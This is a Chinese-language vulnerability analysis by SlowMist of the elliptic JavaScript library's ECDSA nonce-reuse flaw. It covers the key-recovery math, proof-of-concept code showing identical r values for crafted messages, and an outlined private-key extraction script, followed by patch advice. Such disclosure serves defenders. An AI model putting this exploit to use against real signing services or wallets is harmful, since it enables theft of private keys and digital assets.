#  ECDSA 签名中的私钥泄露：elliptic 库畸形输入漏洞分析   
原创 慢雾安全团队  慢雾科技   2025-03-04 18:33  
  
作者：enze  
  
编辑：Liz  
  
  
**引言**  
  
  
近期，JavaScript 生态中广泛使用的 elliptic 加密库被发现存在严重安全漏洞（GHSA-vjh7-7g9h-fjfh）。攻击者可以通过构造特定输入，在仅签名一次的情况下提取私钥，从而完全掌控受害者的数字资产或身份凭证。  
  
  
该漏洞的根本原因在于 elliptic 库对非标准输入的处理缺陷，导致 ECDSA 签名中的随机数 k 可能重复。由于 ECDSA 算法的安全性极度依赖 k 的唯一性，一旦 k 重复，私钥便可被直接推导出来，造成不可逆的安全风险。  
  
  
本文将分析漏洞原理、成因及影响，并提供修复建议，帮助开发者降低安全风险。  
  
# 漏洞背景  
###   
### elliptic 库简介  
  
  
elliptic 是 JavaScript 生态中广泛使用的椭圆曲线密码学库，支持多种曲线（如 secp256k1、ed25519）。该库被大量加密货币钱包、身份认证系统、Web3 应用等使用。  
  
### 影响范围  
  
- 受影响版本：elliptic <= 6.6.0  
  
- 受影响曲线：secp256k1、ed25519 等  
  
- 影响场景：所有接受外部输入进行 ECDSA 签名的应用（特别是接受外部输入进行签名的系统）  
  
如果应用依赖 elliptic 进行 ECDSA 签名，并允许用户提供未经过滤的消息作为签名内容，则极有可能受到该漏洞影响。  
  
# 漏洞原理  
###   
### ECDSA 签名中的随机数 k  
  
  
想象你有一枚独一无二的印章（私钥），每次签署文件时，都需要蘸取一种独特的印泥（随机数 k）。盖出的印迹会生成两个数字 r 和 s，这就是签名结果。  
  
  
这个过程有几个关键点：  
  
- 印章（私钥）始终不变 —— 代表你的身份。  
  
- 每次签名都必须用全新的印泥（随机数 k 绝不能重复）。  
  
- 即使签署相同的文件，签名结果（r, s）也必须不同。  
  
- 任何人都可以验证印迹是否由你的印章盖出（公钥验证签名）。  
  
- 但没人能从印迹反推出你的印章（私钥），只要 k 是安全的。  
  
为了保证 k 的安全性，ECDSA 采用 RFC 6979 规范，使用确定性随机数生成器（HMAC_DRBG 或 HKDF）来计算 k。生成 k 时，使用私钥 d 和消息 m 作为种子，确保 k 在相同输入下固定。计算流程如下：  
  
```
k = combine(d, m) // 确定性随机数，符合 RFC 6979 
R = G × k // 计算椭圆曲线点 R 
r = R.x mod n // 取 R 的 x 坐标作为签名的一部分 
s = k^-1 ⋅ (m + d⋅r) mod n // 计算签名的另一部分 s 
sig = (r, s) // 生成最终签名
```  
  
  
关键点：  
  
  
1. k 必须是随机且唯一的，否则会导致私钥泄露。  
  
2. 如果 k 在两次签名时相同，攻击者可以简单地通过两个签名 (r, s1) 和 (r, s2) 直接恢复私钥 d。  
  
  
数学推导：  
  
  
假设用户对两条不同的消息 m1 和 m2 进行了签名，但随机数 k 意外相同，那么签名结果如下：  
  
```
s1 = (k^-1)⋅(m1 + r⋅d) mod n 
s2 = (k^-1)⋅(m2 + r⋅d) mod n
```  
  
  
攻击者可以计算 s1 和 s2 的差值：  
  
```
s1 - s2 = (k^-1)⋅(m1 - m2) mod n
```  
  
  
由于 m1、m2、s1 和 s2 都是已知的，攻击者可以解出 k：  
  
```
k = ((s1 - s2)^-1) ⋅ (m1 - m2) mod n
```  
  
  
然后，将 k 代入原始签名方程，解出私钥 d：  
  
```
r⋅d = s1⋅k - m1 
d = (r^-1)⋅(s1⋅k - m1) mod n
```  
  
# 漏洞分析  
  
  
elliptic 库本应使用 HMAC_DRBG（确定性随机数生成器）确保每次签名的 k 唯一。然而，由于输入处理的错误，某些情况下不同的消息可能生成相同的 k，导致私钥泄露。  
  
### k 生成代码  
  
  
在 elliptic 库的 sign() 方法中，k 由 HMAC_DRBG 伪随机数生成器生成，相关代码如下：  
  
  
elliptic/lib/elliptic/ec/index.js  
```
msg = this._truncateToN(msg, false, options.msgBitLength);

// Zero-extend key to provide enough entropy
var bytes = this.n.byteLength();
var bkey = key.getPrivate().toArray('be', bytes);

// Zero-extend nonce to have the same byte size as N
var nonce = msg.toArray('be', bytes);

// Instantiate Hmac_DRBG
var drbg = new HmacDRBG({
  hash: this.hash,
  entropy: bkey,
  nonce: nonce,
  pers: options.pers,
  persEnc: options.persEnc || 'utf8',
});
```  
  
  
HMAC_DRBG 的输入参数主要包括：  
  
- entropy（熵） → 这里使用的是私钥 bkey，确保 HMAC_DRBG 具有足够的随机性。  
  
- nonce（随机数种子） → 由 msg 计算而来，影响 k 的最终生成值。  
  
由于 HMAC_DRBG 是确定性的，相同的 entropy 和 nonce 会生成相同的 k。如果 nonce 在不同的签名过程中相同，则 k 也会相同，这将导致私钥泄露。  
###   
### 漏洞成因：BN 转换导致 nonce 复用  
  
  
在 elliptic 的实现中，msg 被转换为 BN (Big Number)，然后 nonce 由 msg.toArray() 计算：  
  
```
var nonce = msg.toArray('be', bytes);
```  
  
  
问题点：  
  
- msg 是 BN 实例，但 nonce 是数组。  
  
- 不同的 BN 实例可能在转换后生成相同的数组。  
  
- 这意味着可以为不同的消息生成相同的 nonce，最终导致 k 复用。  
  
如果 k 在两个不同的消息 msg1 和 msg2 上复用，则可以通过上文提到的数学公式恢复私钥 d。  
  
  
攻击者可以构造特殊的 msg，使其 nonce 相同，从而导致 k 复用。只需要获取一对 (r, s1) 和 (r, s2)，即可通过数学计算恢复私钥 d。更严重的是，攻击者可以针对任何已知的消息/签名对构造这样的恶意 msg，这意味着只要诱导受害者签署一次恶意消息，攻击者就能完全恢复私钥，并伪造任意签名。  
  
### 漏洞利用(PoC)  
  
  
elliptic 库允许使用十六进制字符串作为输入类型之一，在签名时会将 msg 转换为 BN 实例，再转换为数组类型。如果两个不同的消息在转换后生成相同的数组，nonce 也会相同，最终导致 k 复用。  
  
  
代码示例：  
```
const elliptic = require('elliptic');
const crypto = require('crypto');

const { ec: EC } = elliptic;

const privateKey = crypto.getRandomValues(new Uint8Array(32))
const curve = 'secp256k1';
const ec = new EC(curve);

const prettyprint = ({ r, s }) => `r: ${r}, s: ${s}`

const msg1 = 'message';
const msg2 = '-message';

console.log('\n原始消息:');
console.log('msg1:', msg1);
console.log('msg2:', msg2);

const sig1 = prettyprint(ec.sign(msg1, privateKey));
const sig2 = prettyprint(ec.sign(msg2, privateKey));

console.log('签名结果:');
console.log('sig1:', sig1);
console.log('sig2:', sig2);
```  
  
  
运行输出：  
```
原始消息:
msg1: message
msg2: -message
签名结果:
sig1: r: 104603683070405608893121994772569954579668786354993804047147606840356574004233, s: 45238971282208969875952227936984289798913868693111844367904834409773355688280
sig2: r: 104603683070405608893121994772569954579668786354993804047147606840356574004233, s: 33413981207006126473424310277806110366155448264152524923855174498663885342744
```  
  
  
msg1 = "message" 和 msg2 = "-message" 经过 BN 转换后，生成了相同的 nonce（elliptic 的设计接受十六进制字符串作为可能的输入类型之一）。由于 nonce 相同，导致 HMAC_DRBG 生成的 k 也相同。从签名结果中可以看到，r 值完全相同，这正是 k 复用的直接表现。  
  
  
完整攻击流程：  
  
  
1. 模拟受害者签名一条正常的消息，获取消息 msg0 和签名 sig0。  
  
2. 攻击者构造恶意消息 msg1，并诱导受害者进行签名，获得 sig1。  
  
3. 利用 k 复用漏洞，从 (r, s1) 和 (r, s2) 计算 k。  
  
4. 利用 k 进一步计算出私钥 d，攻击成功。  
  
  
代码示例：  
```
const elliptic = require('elliptic');
const BN = require('bn.js');
const keccak256 = require('keccak256');

const { ec: EC } = elliptic

const curve = 'secp256k1' // or any other curve, e.g. ed25519
const ec = new EC(curve)
const privateKey = crypto.getRandomValues(new Uint8Array(32))  // 随机私钥

// 模拟受害者签署一笔正常的交易消息
const message = "Example `personal_sign` message";
const msg0 = createEthereumSignatureMessage(message);
const sig0 = ec.sign(msg0, privateKey);

// 构造恶意消息
const msg1 = Maliciousmsg(msg0);

// 模拟受害者签署恶意消息
const sig1 = ec.sign(msg1, privateKey);

// 利用数学计算提取签名
const Fake_privateKey = extract(msg0, sig0, sig1, curve)

console.log('Curve:', curve)
console.log('Typeof:', typeof msg1)
console.log('Keys equal?', Buffer.from(privateKey).toString('hex') === Fake_privateKey)
const rnd = crypto.getRandomValues(new Uint8Array(32))
const st = (x) => JSON.stringify(x)
console.log('Keys equivalent?', st(ec.sign(rnd, Fake_privateKey).toDER()) === st(ec.sign(rnd, privateKey).toDER()))
console.log('Orig key:', Buffer.from(privateKey).toString('hex'))
console.log('Restored:', Fake_privateKey)
```  
  
  
运行输出：  
```
Curve: secp256k1
Typeof: object
Keys equal? true
Keys equivalent? true
Orig key: dcd768c5a8346fe51d24377b1e7c47b2afa6d5e8a4fd12de685fce59d4d83e8d
Restored: dcd768c5a8346fe51d24377b1e7c47b2afa6d5e8a4fd12de685fce59d4d83e8d
```  
#   
# 修复建议  
  
  
1. 升级 elliptic 至 6.6.1+，官方已修复该问题。  
  
2. 避免直接签名未经验证的消息，确保 msg 经过标准化处理。  
  
3. 更换可能受影响的私钥。  
#   
# 总结  
  
  
elliptic 的这个漏洞暴露了 ECDSA 签名对随机数 k 的极端敏感性。一旦 k 复用，私钥便可被直接恢复，攻击者可完全控制用户资产和身份。开发者应及时修复漏洞，并严格规范输入处理，以确保 ECDSA 签名的安全性。最后，感谢 Rabby 钱包提供的漏洞情报。  
  
  
**参考资料**  
  
[1] https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh  
[2] https://paulmillr.com/posts/deterministic-signatures  
  
  
**往期回顾**  
  
[每月动态 | Web3 安全事件总损失约 16.81 亿美元](https://mp.weixin.qq.com/s?__biz=MzU4ODQ3NTM2OA==&mid=2247501354&idx=1&sn=f1726906073c7aaae5672e0403fae50e&scene=21#wechat_redirect)  
  
  
[Bybit 近 15 亿美金被盗真相 ：Safe{Wallet} 前端代码被篡改](https://mp.weixin.qq.com/s?__biz=MzU4ODQ3NTM2OA==&mid=2247501336&idx=1&sn=2ad6eea9d1534aab1a5dea8dd06ea6a3&scene=21#wechat_redirect)  
  
  
[OKX & SlowMist 联合发布｜Bom 恶意软件席卷上万用户，盗取资产超 182 万美元](https://mp.weixin.qq.com/s?__biz=MzU4ODQ3NTM2OA==&mid=2247501336&idx=2&sn=fd4597e1846db1f94a777977951fde9a&scene=21#wechat_redirect)  
  
  
[慢雾解析｜Safe 困局，Guard 能否重构契约巴别塔？](https://mp.weixin.qq.com/s?__biz=MzU4ODQ3NTM2OA==&mid=2247501278&idx=1&sn=78004ffc4dc09460a509369556a45ff9&scene=21#wechat_redirect)  
  
  
[慢雾招聘令 | 加入我们，开启 Web3 安全之旅！](https://mp.weixin.qq.com/s?__biz=MzU4ODQ3NTM2OA==&mid=2247501278&idx=2&sn=3a35e5354af1d075bf72a76dad3e9e45&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qsQ2ibEw5pLaa3Th7YiamUUBwq1Iiby9N9lWh3tKP2MVjM6L3UxtTnuUy6iaegsOP2IrqZYsIBM2v3XgC5O2JTbY5g/640?wx_fmt=png&from=appmsg "")  
  
**慢雾导航**  
  
  
**慢雾科技官网**  
  
https://www.slowmist.com/  
  
  
**慢雾区官网**  
  
https://slowmist.io/  
  
  
**慢雾 GitHub**  
  
https://github.com/slowmist  
  
  
**Telegram**  
  
https://t.me/slowmistteam  
  
  
**Twitter**  
  
https://twitter.com/@slowmist_team  
  
  
**Medium**  
  
https://medium.com/@slowmist  
  
  
**知识星球**  
  
https://t.zsxq.com/Q3zNvvF  
  
